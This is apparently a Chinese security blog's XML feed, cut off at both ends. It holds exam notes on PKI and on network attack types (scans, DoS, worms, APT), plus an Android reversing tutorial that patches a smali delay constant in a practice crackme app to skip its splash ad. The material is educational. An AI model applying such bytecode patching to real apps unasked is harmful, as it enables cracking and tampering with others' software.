class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span></span></span></span>﻿签名的双重机制</li><li>颁发者：CA机构的身份信息</li><li>有效期：明确的起止日期</li><li>公钥：证书所有者的公开密钥（核心内容）</li></ul></li></ul><p><strong>分类方式</strong>：</p><ul><li>按主体：个人证书、机构证书、设备证书</li><li>按用途：签名证书（证明签名公钥）、加密证书（证明加密公钥）</li></ul><p><strong>CA服务</strong>：提供证书全生命周期管理，包括<strong>申请、审核、签发、查询、发布及吊销</strong>等服务。</p><p><strong>系统组成</strong>：包含<strong>目录服务器、OCSP服务器、注册服务器、签发服务</strong>器等组件。</p><h3 id="pki体系">PKI体系</h3><p><img src="https://image.icewindy.cn/2025/07/3f27aad507c30012c4ac65f884261dd3.png" alt="image-20250723154629578"></p><ul><li>核心组件：<ul><li>RA：<strong>注册机构</strong>，负责用户证书申请的资格审查（如营业执照验证），不直接签发证书。</li><li>CA：<strong>证书颁发机构</strong>，负责证书的颁发、管理和撤销（核心功能）。</li><li>CRL：<strong>证书吊销列表</strong>，存放过期或无效证书（有效期管理机制）。</li></ul></li><li>考试重点：<ul><li>RA的功能定位（用户注册审核）</li><li>CA的核心职责（证书签发管理）</li><li>CRL的定义作用（无效证书存储）</li><li>PKI体系与Kerberos体系（内含KDC、AS、TGS）是不同的体系</li></ul></li></ul><h2 id="密钥管理">密钥管理</h2><ul><li>生命周期管理：包括<strong>密钥生成、存储、分发、使用、更新、撤销、备份、恢复、销毁和审计</strong>全过程</li><li>密钥管理政策：<ul><li>核心密码：<strong>保护国家秘密信息</strong>，由国家密码管理部门统一管理</li><li>普通密码：<strong>保护国家秘密信息</strong>，属于国家秘密</li><li>商用密码：保护非国家秘密信息（如SM1-SM4、SM9算法），公民法人可用</li></ul></li><li>密码测评<ul><li>测评内容：对密码产品及系统进行<strong>安全性和合规性</strong>评估</li><li>实施机构：国家商用密码检测中心负责测评工作</li><li>保障目标：确保密码系统安全有效运行</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（2）：网络攻击原理与常用方法</title>
      <link href="/2025/07/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%882%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2025/07/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%882%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="网络攻击基础与模型">网络攻击基础与模型</h2><h3 id="攻击原理表">攻击原理表</h3><ul><li>攻击者分类：黑客（挑战/好奇）、间谍（获取情报）、恐怖主义者（恐怖事件）、公司职员（报复）、职业犯罪分子（经济利益）、破坏者（无目的破坏）</li><li>攻击内容：<ul><li>用户命令（如cmd命令）</li><li>脚本/程序</li><li>自治主体（黑客自研工具）</li><li>电磁泄露（通过电磁感应窃取数据，防护措施：光纤/屏蔽网线）</li></ul></li><li>攻击访问：本地访问（内鬼）、远程访问（黑客）</li><li>攻击效果-CIA对应：<ul><li>破坏信息→完整性</li><li>信息泄密/窃取服务→机密性</li><li>拒绝服务→可用性</li></ul></li></ul><h3 id="网络攻击模型-考选择题为主-了解即可">网络攻击模型（考选择题为主，了解即可）</h3><p><strong>攻击树模型</strong></p><img src="https://image.icewindy.cn/2025/07/a3add7061f3f4cb4118dfa2a09e40e9a.png" alt="image-20250722144255930" style="zoom:50%;" /><ul><li><p>起源：由故障树分析方法扩展而来，采用AND-OR树形结构</p></li><li><p>典型应用：</p><ul><li>红队（Red Team）用于渗透测试</li><li>蓝队（Blue Team）用于防御研究</li></ul></li><li><p>优点：</p><ul><li>支持专家头脑风暴整合</li><li>可进行费效/概率分析</li><li>能建模复杂攻击场景</li></ul></li><li><p>缺点：</p><ul><li>无法处理多重尝试攻击</li><li>不能建模时间依赖/循环事件</li><li>大规模网络处理复杂度高</li></ul></li></ul><p><strong>MITRE ATT&amp;CK模型</strong></p><ul><li>本质：基于真实攻击数据提炼的<strong>攻击矩阵模型</strong></li><li>四大应用场景（<strong>主要记忆</strong>）：<ul><li>网络红蓝对抗模拟</li><li>网络安全渗透测试</li><li>网络防御差距评估</li><li>网络威胁情报收集</li></ul></li></ul><p><strong>网络杀伤链（Kill Chain）模型</strong></p><ul><li>阶段划分：<strong>7个攻击阶段</strong>（目标侦察→武器构造→载荷投送→漏洞利用→安装植入→指挥控制→目标行动）</li><li>区别划分：与ATT&amp;CK模型差别是线性阶段划分，而非矩阵结构。</li></ul><h3 id="网络攻击趋势">网络攻击趋势</h3><ul><li>攻击智能化、自动化</li><li>攻击者群体普适化（攻击更简单）</li><li>攻击目标多样化和隐蔽性</li><li>攻击计算资源获取方便（DDOS/云计算口令破解）</li><li>攻击活动持续化强（APT攻击） ：渐进化渗透、长期化（震网）</li><li>攻击主体组织化</li></ul><h3 id="网络攻击一般过程-8步曲">网络攻击一般过程（8步曲）</h3><ol><li>隐藏攻击源（跳板代理）</li><li>收集攻击目标信息（信息收集）</li><li>获取目标访问权限</li><li>隐蔽攻击行为</li><li>实施攻击</li><li>开辟后门（持久化）</li><li>清除攻击痕迹</li></ol><h2 id="网络攻击常见技术方法">网络攻击常见技术方法</h2><h3 id="端口扫描">端口扫描</h3><ul><li>目的：通过逐个尝试与TCP/UDP端口连接，结合服务器返回信息，推断运行的服务</li><li>扫描方法：<ul><li>完全连接扫描（完整的TCP三次握手）</li><li>半连接扫描/SYN扫描（仅完成前两次握手，不发送ACK）：若收到SYN+ACK则端口开放，无响应则关闭。</li><li>ID头信息扫描：<strong>必要条件：需要第三方“哑主机”（dumb主机）</strong><ul><li>源主机A向哑主机B发送连续PING包，记录ID头递增规律（如4,5,6…）</li><li>A冒充B向目标主机C发送SYN包</li><li>观察B返回A的ID头：<ul><li>C端口关闭：ID头保持连续递增（如7,8,9…）</li><li>C端口开放：ID头不连续（如7,10,12…因C与B产生额外通信）</li></ul></li></ul></li><li>隐蔽扫描：绕过IDS、防火墙等</li><li>SYN|ACK扫描：直接发送SYN|ACK包，<strong>关闭会返回RST信息，开放则无返回</strong></li><li>FIN扫描：发送FIN数据包，<strong>关闭会返回RST信息，开放则无返回</strong></li><li>ACK扫描：发送FIN数据包<ul><li>TTL：开放端口&lt;64 关闭端口&gt;64</li><li>WIN：开放端口&gt;0 关闭端口=0</li></ul></li><li>NULL/XMAS扫描：与标记位ACK, FIN, RST, SYN, URG, PSH有关，<strong>关闭会返回RST信息，开放则无返回</strong><ul><li>NULL：标记位全部置0</li><li>XMAS：标记为全部置1</li></ul></li></ul></li></ul><h3 id="口令破解">口令破解</h3><ul><li>攻击突破口: 网络攻击者常以破解弱口令作为突破口获取系统访问权限</li><li>主要目标: 主要针对简单密码如&quot;123456&quot;、&quot;111111&quot;等易破解的弱口令</li><li>攻击流程:<ul><li>建立与目标网络服务的连接</li><li>准备用户名列表和字典文件</li><li>按协议规定发送用户名和密码组合</li><li>检测服务返回信息判断是否成功</li><li>循环尝试直至字典穷尽</li></ul></li></ul><h3 id="缓冲区溢出攻击">缓冲区溢出攻击</h3><ul><li><strong>核心原理</strong>: 向缓冲区写入超出其容量的数据，覆盖正常程序或数据，使计算机转去执行攻击者预设的程序代码</li><li>攻击后果:<ul><li>直接破坏：导致程序执行出错崩溃，正常功能无法继续</li><li>隐蔽攻击：精心构造的输入不会引发明显错误，能精确执行攻击者预设的操作，实现非法控制或数据窃取</li></ul></li><li>解决方案：<ul><li>输入检查</li><li>安全函数</li><li>内存保护</li></ul></li></ul><h3 id="恶意代码">恶意代码</h3><ul><li>定义: 为达到恶意目的而专门设计的程序或代码，旨在破坏计算机或网络系统的可靠性、可用性、安全性和数据完整性，或损耗系统资源。</li><li>类型：计算机病毒，蠕虫，特洛伊，后门，逻辑炸弹，僵尸网络</li></ul><h3 id="拒绝服务攻击dos">拒绝服务攻击DOS</h3><p>攻击者通过恶意消耗<strong>系统资源（CPU、内存、硬盘、网络带宽等）</strong>，使目标系统无法为正常用户提供服务。</p><p><strong>典型攻击手段</strong>：</p><ul><li><p>SYN Flood泛洪攻击</p><ul><li>原理: 利用TCP三次握手缺陷，攻击者发送大量伪造SYN包但不完成第三次ACK确认。</li><li>主要<strong>消耗内存资源</strong>。</li></ul></li><li><p>UDP Flood</p><ul><li>特点: 持续发送海量UDP报文，主要消耗目标主机的<strong>网络带宽资源</strong>。</li><li>对比: 与SYN Flood不同，UDP无连接状态，攻击更直接但防御相对容易。</li></ul></li><li><p>Smurf攻击</p><ul><li><p>具有放大效应，一个请求触发多个响应。</p></li><li><p>攻击流程</p><ul><li>攻击者伪装目标主机IP</li><li>向局域网广播地址发送ICMP请求</li><li>局域网内所有主机向目标回应ICMP响应</li></ul></li></ul></li><li><p>垃圾邮件攻击</p><ul><li>方式: 通过邮件炸弹程序发送海量垃圾邮件。</li><li>目标: 耗尽用户邮箱的<strong>磁盘存储空间</strong>。</li></ul></li><li><p>算法资源攻击</p><ul><li>原理: 利用计算算法漏洞（如Hash碰撞），构造恶意输入使CPU/内存过载。</li><li>案例: Hash DoS通过精心构造的输入使哈希表退化为链表，大幅降低查询效率。</li></ul></li><li><p>Ping of Death/畸形报文攻击</p><ul><li>特征: 发送超过65535字节的畸形IP数据包。</li><li>漏洞原因: 早期TCP/IP栈未做长度校验，导致缓冲区溢出。</li></ul></li><li><p>Teardrop泪滴攻击</p><ul><li>技术细节: 伪造IP分片报文，设置重叠偏移量使重组失败。</li></ul></li><li><p>DDoS分布式拒绝服务攻击：通过肉鸡发起协同攻击</p></li></ul><h3 id="网络钓鱼">网络钓鱼</h3><p>通过假冒官方网站诱导用户输入用户名密码等敏感信息</p><h3 id="网络窃听">网络窃听</h3><ul><li>攻击本质: 非法获取网络传输中的敏感信息（如密码）</li><li>技术实现: 需要将网卡设置为<strong>混杂模式</strong>（Promiscuous mode）</li><li>网络要求：集线器连接</li></ul><h3 id="sql注入">SQL注入</h3><p>插入恶意SQL命令</p><h3 id="社交工程">社交工程</h3><p>社会工程学（如杀猪盘、电信诈骗）</p><h3 id="电子监听">电子监听</h3><ul><li>监听对象:<ul><li>键盘输入的电磁泄漏</li><li>屏幕显示内容的辐射信号</li><li>温度变化等物理量信息</li></ul></li></ul><h3 id="会话劫持">会话劫持</h3><ul><li>典型示例:<ul><li>TCP会话劫持：窃取会话信息后仿冒合法用户通信</li><li>桌面劫持：利用用户离开时物理接触设备（如借用电脑）</li></ul></li><li>攻击效果: 绕过身份认证环节，直接获得合法权限</li></ul><h3 id="漏洞扫描">漏洞扫描</h3><ul><li>双重用途: 既可用于攻击前侦察，也可用于防御性检测</li><li>扫描类型:<ul><li>CGI漏洞扫描</li><li>弱口令扫描</li><li>操作系统漏洞扫描</li><li>数据库漏洞扫描</li></ul></li><li>防御应用: 通过主动扫描发现漏洞后实施加固措施</li></ul><h3 id="代理技术">代理技术</h3><ul><li>核心目的: 隐藏攻击者真实身份和IP地址</li><li>实现方式:<ul><li>使用免费代理服务器作为&quot;攻击跳板&quot;</li><li>采用多级代理（跳板主机）增加追踪难度</li></ul></li></ul><h3 id="数据加密">数据加密</h3><ul><li>攻击者用途:逃避网络安全管理人员跟踪</li><li>防御应用:<ul><li>加密敏感信息防止窃听</li><li>即使数据被截获也无法解密使用</li></ul></li><li>安全原则: 所有攻击相关数据必须加密处理或者立即销毁</li></ul><h2 id="黑客常用工具">黑客常用工具</h2><h3 id="扫描器">扫描器</h3><ul><li>基础功能：通过扫描程序获取目标的IP地址、开放端口号、服务器版本信息及潜在漏洞</li><li>分类依据：根据扫描目的不同分为三类：<ul><li>地址扫描器：检测网段内活跃IP</li><li>端口扫描器：识别活跃主机开放的端口</li><li>漏洞扫描器：分析服务器程序版本及漏洞</li></ul></li></ul><h3 id="远程监控">远程监控</h3><ul><li>运作机制：黑客通过管理端控制肉鸡</li><li>主要用途：<ul><li>发起DDoS攻击</li><li>作为攻击跳板</li></ul></li></ul><h3 id="密码破解">密码破解</h3><ul><li>攻击方式：<ul><li>口令猜测：针对弱密码</li><li>穷举搜索：利用高性能计算机尝试所有可能组合</li><li>撞库攻击：基于已有密码数据库进行匹配尝试</li></ul></li></ul><h3 id="网络嗅探器">网络嗅探器</h3><ul><li>核心功能：截获并分析网络数据包（可能包含明文传输的账号密码）</li><li>安全风险：未加密通信中可直接获取传输内容（如HTTP协议）</li></ul><h3 id="安全渗透工具箱">安全渗透工具箱</h3><ul><li>系统化方案：集成多种攻击工具的操作系统</li><li>典型代表：<ul><li>Metasploit</li><li>Kali Linux</li></ul></li></ul><h2 id="网络攻击案例分析">网络攻击案例分析</h2><h3 id="ddos">DDoS</h3><p>分布式拒绝服务攻击，通过控制大量主机同时发起攻击</p><ul><li>目标探测：扫描大量主机寻找可攻击目标</li><li>漏洞利用：攻击存在安全漏洞的主机并获取控制权</li><li>程序植入：在被控主机安装客户端攻击程序</li><li>扩散感染：以已攻陷主机为跳板继续扫描攻击新目标</li><li>集中攻击：当控制足够数量主机后，主控端统一发起攻击指令</li></ul><p><strong>常用技术手段：</strong></p><ul><li>HTTP Flood攻击</li><li>SYN Flood攻击</li><li>DNS放大攻击<ul><li>通过肉鸡伪造目标IP向多个DNS服务器发送查询请求，DNS服务器将应答包集中发送至目标系统，利用UDP协议无连接特性产生流量洪泛</li><li>协议特性：基于UDP协议，主要消耗目标网络带宽资源</li></ul></li></ul><h3 id="w32-blaster-worm">W32.Blaster.Worm</h3><p><strong>名称含worm后缀的是网络蠕虫</strong>（选择题重要考点）</p><ul><li>利用漏洞：DCOM RPC服务漏洞（TCP 135端口）</li><li>破坏表现：<ul><li>导致系统频繁重启</li><li>攻击windowsupdate.com阻止补丁更新</li><li>形成持续传播感染链</li></ul></li><li>传播途径：通过局域网扫描主动寻找漏洞主机</li><li>高危端口：135,139,445</li></ul><img src="https://image.icewindy.cn/2025/07/3838055c21f903f454d54ada009e2b08.png" alt="image-20250722191202032" style="zoom:67%;" /><h3 id="乌克兰电力攻击事件">乌克兰电力攻击事件</h3><ul><li>钓鱼邮件诱导：黑客利用<strong>钓鱼</strong>邮件欺骗电力公司员工下载带有BlackEnergy恶意代码的文件</li><li>木马激活：诱导用户打开文件激活<strong>木马</strong>程序，获取电脑控制权</li><li>后门安装：安装SSH<strong>后门</strong>和系统自毁工具Killdisk，最终获得主控电脑控制权</li><li>断电操作：远程操作恶意代码断开主控计算机与变电站连接并切断电源</li><li>干扰维修：同时发动<strong>DDoS</strong>攻击电力客服中心，阻止工作人员进行维修</li></ul><img src="https://image.icewindy.cn/2025/07/e5d4215cf6223ddedf16e7cfde3b9fb2.png" alt="image-20250722191420804" style="zoom: 50%;" /><h3 id="apt攻击">APT攻击</h3><ul><li><p><strong>技术高级(A)</strong>：使用多种攻击途径，包括0Day漏洞，能动态调整攻击方式</p></li><li><p><strong>持续时间长§</strong>：有明确目标，通过长期信息收集、监控、渗透逐步实施</p></li><li><p><strong>威胁性大(T)</strong>：通常由国家支持的黑客团队发起，针对关键基础设施</p></li><li><p><strong>防范措施</strong>：</p><ul><li>综合分析：通过安全沙箱、大数据分析、态势感知等平台联动</li><li>多设备协同：不依赖单一安全设备，需要全网安全设备统一分析</li><li>安全管理：定期数据备份、漏洞扫描等基础安全措施</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向（3）：四大组件、Activity、弹窗定位、布局优化</title>
      <link href="/2025/07/22/Android%E9%80%86%E5%90%91%EF%BC%883%EF%BC%89%EF%BC%9A%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E3%80%81Activity%E3%80%81%E5%BC%B9%E7%AA%97%E5%AE%9A%E4%BD%8D%E3%80%81%E5%B8%83%E5%B1%80%E4%BC%98%E5%8C%96/"/>
      <url>/2025/07/22/Android%E9%80%86%E5%90%91%EF%BC%883%EF%BC%89%EF%BC%9A%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E3%80%81Activity%E3%80%81%E5%BC%B9%E7%AA%97%E5%AE%9A%E4%BD%8D%E3%80%81%E5%B8%83%E5%B1%80%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="广告类型">广告类型</h2><p>启动广告 弹窗&amp;更新广告 横幅广告</p><img src="https://image.icewindy.cn/2025/07/af919988c7f3f7ae142bb4e4f0f010b8.png" style="zoom:50%;" /><h2 id="安卓四大组件">安卓四大组件</h2><table><thead><tr><th style="text-align:left">组件</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Activity(活动)</td><td style="text-align:left">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。在一个应用中我们所有能看到的界面都是Activity。</td></tr><tr><td style="text-align:left">Service(服务)</td><td style="text-align:left">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td></tr><tr><td style="text-align:left">Broadcast Receiver(广播接收器)</td><td style="text-align:left">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td></tr><tr><td style="text-align:left">Content Provider(内容提供者)</td><td style="text-align:left">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td></tr></tbody></table><h2 id="activity">Activity</h2><p>现在我们来到第三关，一点开我们就看到了一个启动广告</p><img src="https://image.icewindy.cn/2025/07/2a07a41987ff83e1ae4d963ae894c718.png" alt="image-20250722112834356" style="zoom:33%;" /><p>前面说过全部界面都是Activity，因此这个广告界面也是Activity。</p><p>启动广告的流程：启动Activity-&gt;广告Activity-&gt;主页Activity</p><p>因此我们可以想到有两种修改的方法：</p><ul><li>修改加载时间</li><li>Activity切换定位，修改Intent的Activity类名称</li></ul><p>我们可以用Activity定位来找到我们可以修改的位置，打开开发者工具，选择当前Activity</p><p><img src="https://image.icewindy.cn/2025/07/df905c7087b3e5ef92bf944c188ac2c6.png" alt="image-20250722124244153"></p><p>可以找到启动广告的Activity类名为<code>com.zj.wuaipojie.ui.AdActivity</code>，通过类名我们可以快速定位到对应的逻辑位置</p><img src="https://image.icewindy.cn/2025/07/2b462e47b9b71eb0f582ad4e7a61ca4a.png" alt="image-20250722124635821" style="zoom: 33%;" /><p>我们先来看反编译后Java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AdActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.ad_activity);</span><br><span class="line">        loadAd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">jump</span><span class="params">()</span> &#123;</span><br><span class="line">        startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) ChallengeThird.class));</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">loadAd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>().postDelayed(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123; <span class="comment">// from class: com.zj.wuaipojie.ui.AdActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.f$<span class="number">0.</span>jump();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">3000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个很简单的逻辑，就是先通过<code>onCreate</code>启动一个实例，然后在里面使用<code>loadAd()</code>方法，其中设置为3000ms，然后最后使用<code>jump()</code>跳转到后续的Activity。</p><h3 id="修改加载时间">修改加载时间</h3><p>现在我们要通过第一种方法：修改加载时间来完成跳启动广告的目的，打开np管理器，用同样的类搜索到广告页面的实现处，在此处，我们通过修改smali代码来实现修改加载时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">public</span> <span class="keyword">static</span> synthetic $r8$lambda$Ba8g8Cpz5n6fbKN5g2ojikJ3IFo(Lcom/zj/wuaipojie/ui/AdActivity;)V</span><br><span class="line">    .registers <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p0&#125;, Lcom/zj/wuaipojie/ui/AdActivity;-&gt;loadAd$lambda-<span class="number">0</span>(Lcom/zj/wuaipojie/ui/AdActivity;)V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method <span class="keyword">public</span> constructor &lt;init&gt;()V</span><br><span class="line">    .registers <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">10</span></span><br><span class="line">    invoke-direct &#123;p0&#125;, Landroidx/appcompat/app/AppCompatActivity;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method <span class="keyword">private</span> <span class="keyword">final</span> <span class="title function_">jump</span><span class="params">()</span>V</span><br><span class="line">    .registers <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">23</span></span><br><span class="line">    <span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"></span><br><span class="line">    move-object v1, p0</span><br><span class="line"></span><br><span class="line">    check-cast v1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-<span class="keyword">class</span> <span class="title class_">v2</span>, Lcom/zj/wuaipojie/ui/ChallengeThird;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0, v1, v2&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, v0&#125;, Lcom/zj/wuaipojie/ui/AdActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">24</span></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Lcom/zj/wuaipojie/ui/AdActivity;-&gt;finish()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method <span class="keyword">private</span> <span class="keyword">final</span> <span class="title function_">loadAd</span><span class="params">()</span>V</span><br><span class="line">    .registers <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">27</span></span><br><span class="line">    <span class="keyword">new</span>-instance v0, Landroid/os/Handler;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0&#125;, Landroid/os/Handler;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>-instance v1, Lcom/zj/wuaipojie/ui/AdActivity$$ExternalSyntheticLambda0;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v1, p0&#125;, Lcom/zj/wuaipojie/ui/AdActivity$$ExternalSyntheticLambda0;-&gt;&lt;init&gt;(Lcom/zj/wuaipojie/ui/AdActivity;)V</span><br><span class="line"></span><br><span class="line">    const-wide/<span class="number">16</span> v2, <span class="number">0xbb8</span> <span class="comment">//此处为我们要修改的时间位置，0xbb8转换为10进制即3000</span></span><br><span class="line">    <span class="comment">//const-wide/16 v2, 0x0</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1, v2, v3&#125;, Landroid/os/Handler;-&gt;postDelayed(Ljava/lang/Runnable;J)Z</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>修改完成后我们打开app，发现开屏广告直接没有了</p><img src="https://image.icewindy.cn/2025/07/3a64f1799fba70002ae853652b7a1a46.png" alt="image-20250722125836264" style="zoom: 33%;" /><h3 id="修改androidmanifest内类名-不推荐">修改AndroidManifest内类名（不推荐）</h3><p>声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的<code>&lt;activity&gt;</code>元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。我们先来看到AndroidManifest.xml文件，Activity的注册都写在了这个文件内</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSixth&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span></span></span><br><span class="line"><span 